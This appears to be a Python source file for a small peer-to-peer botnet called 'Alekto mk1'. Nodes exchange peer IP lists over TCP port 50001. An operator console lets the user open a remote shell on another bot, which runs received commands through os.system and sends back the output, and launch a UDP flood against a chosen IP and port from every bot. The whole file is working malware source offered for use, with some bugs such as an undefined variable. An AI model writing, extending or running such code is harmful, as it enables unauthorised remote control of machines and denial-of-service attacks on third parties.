
import socket
from subprocess import Popen, PIPE
import time
import os
import threading
import queue
import random
os.system('clear')
print("""\033[91m
   ___   __   ______ ____________    __  _____ __  ___
  / _ | / /  / __/ //_/_  __/ __ \  /  |/  / //_/ <  /
 / __ |/ /__/ _// ,<   / / / /_/ / / /|_/ / ,<    / /
/_/ |_/____/___/_/|_| /_/  \____/ /_/  /_/_/|_|  /_/

\033[0m
""")
def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('8.8.8.4', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
def sendfyi(target, newIP):
    #'fyi:ownIP'
    toSend = 'fyi:' + newIP
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    i = 1
    while i == 1:
        try:
            s.connect((target, 50001)) # add try statment in while loop
        except:
            i = 1
            print('error connecting')
        else:
            i = 0
    s.send(toSend.encode())
    s.close()
def sendnew(target, ownIP):
    toSend = 'new:' + ownIP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    i = 1
    while i == 1:
        try:
            s.connect((target, 50001))
        except:
            i = 1
            print('error connecting')
        else:
            i = 0
    s.send(toSend.encode())
    s.close()
def sendupdate(target, oldIP, ownIP):
    toSend = 'update:' + oldIP + ':' + ownIP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    i = 1
    while i == 1:
        try:
            s.connect((target, 50001))
        except:
            i = 1
            print('error connecting')
        else:
            i = 0
    s.send(toSend.encode())
    s.close()
def sendshell(target, ownIP):
    toSend = 'shell:' + ownIP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    i = 1
    while i == 1:
        try:
            s.connect((target, 50001))
        except:
            i = 1
            print('error connecting')
        else:
            i = 0
        s.send(toSend.encode())
        s.close()
def sendddos(targetBot, ddosTarget, targetPort, packetCount):
    toSend = 'ddos:' + ddosTarget + ':' + targetPort + ':' + packetCount
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    i = 1
    while i == 1:
        try:
            s.connect((targetBot, 50001))
        except:
            i = 1
            print('error connecting')
        else:
            i = 0
    s.send(toSend.encode())
    s.close


os.system("")
ownIP = getIP()
oldIP = ownIP
otherIPs = []
targetIP = input('enter IP of another bot or 0 for first bot: ')
if targetIP != '0':
    otherIPs.append(targetIP)
    #print(otherIPs)
    sendnew(targetIP, ownIP) #change to sendnew



listener = Popen(['python3', 'listener.py'], stdout=PIPE, stderr=PIPE)
i = 0
while i == 0:
    try:       
        listenerPipe = listener.stdout.readline()
        s = str(listenerPipe)
        s = s.strip("b'").strip("'")
        a = s.split(':')
        a[-1] = a[-1].strip('\\n')



        if a[0] == 'new':
            otherIPs.append(a[1])
            for ii in range(0, len(otherIPs)):
                if otherIPs[ii] != a[1]:
                    iii = 1
                    while iii == 1:
                        try:
                            sendfyi(otherIPs[ii], a[1])
                        except:
                            iii = 1
                        else:
                            iii = 0
                    iii = 1
                    while iii == 1:
                        try:
                            sendfyi(a[1], otherIPs[ii])
                        except:
                            iii = 1
                        else:
                            iii = 0
            print('got new ', otherIPs)
        
        if a[0] == 'update':
            for ii in range(0, len(otherIPs)):
                if otherIPs[ii] == a[1]:
                    otherIPs.remove(a[1])
            otherIPs.append(a[2])
        
        if a[0] == 'fyi':
            otherIPs.append(a[1])
            print('got fyi ', otherIPs)
        
        if a[0] == 'shell':
            #started
            shellSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shellSocket.connect((a[1], 50002))
            shellClient = True
            while shellClient == True:
                print('started recev')
                command = shellSocket.recv(1024)
                if command == 'exit':
                    shellSocket.close()
                    shellClient = False
                else:
                    exe = command.decode() + ' > temp.txt'
                    os.system(exe)
                    f = open('temp.txt')
                    for ii in f:
                        shellSocket.send(ii.encode())
                    f.close()
                    shellSocket.send('end of file'.encode())

        if a[0] == 'ddos':
            ddosTarget = a[1]
            ddosTargetPort = int(a[2])
            ddosPacketCount = int(a[3])
            data = random._urandom(1024)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for ii in range(0, int(ddosPacketCount)):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((ddosTarget, ddosTargetPort))
                s.send(data)
                print('packet sent')
                s.close()



        ownIP = getIP()
        if ownIP != oldIP:
            print('update needed')
            for ii in range(0, len(otherIPs)):
                sendupdate(otherIPs[ii], oldIP, ownIP)
            oldIP = newIP
            print('updated')
    
    
    
    except KeyboardInterrupt:
        cnc = True
        while cnc == True:
            inp = input('>>> ')
            
            
            
            if inp == 'help':
                print("""
help:           print this help page.
return:         return to listener.
exit:           exit bot.
shell:          open shell to other bot, prompt for IP. 
list:           list connected bot IPs.
ddos:           start ddos attack.
                """)
            
            if inp == 'return':
                cnc = False
            
            if inp == 'exit':
                exit()
            
            if inp == 'shell':
                #starter
                shellTarget = input('enter target IP: ')
                sendshell(shellTarget, ownIP)
                serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                serverSocket.bind(('', 50002))
                serverSocket.listen()
                conn, addr = serverSocket.accept()
                shellCommand = True
                while shellCommand == True:
                    command = input((shellTarget + ': '))
                    conn.send(command.encode())
                    if command == 'exit':
                        conn.send('exit'.encode())
                        serverSocket.close()
                        shellCommand = False
                    receving = True
                    while receving == True:
                        feedLine = conn.recv(1024)
                        edited = feedLine.decode()
                        if edited.find('end of file') != -1:
                            receving = False
                        else:
                            print(edited)
            
            if inp == 'list':
                for ii in otherIPs:
                    print(ii)
            
            if inp == 'ddos':
                ddosTarget = input('enter target ip of DDoS attack: ')
                targetPort = input('enter target port of DDoS attack: ')
                packetCount = input('enter number of packets each bot should send: ')
                for ii in range(0, len(otherIPs)):
                    if otherIPs[ii] != getIP():
                        sendddos(otherIPs[ii], ddosTarget, targetPort, packetCount)
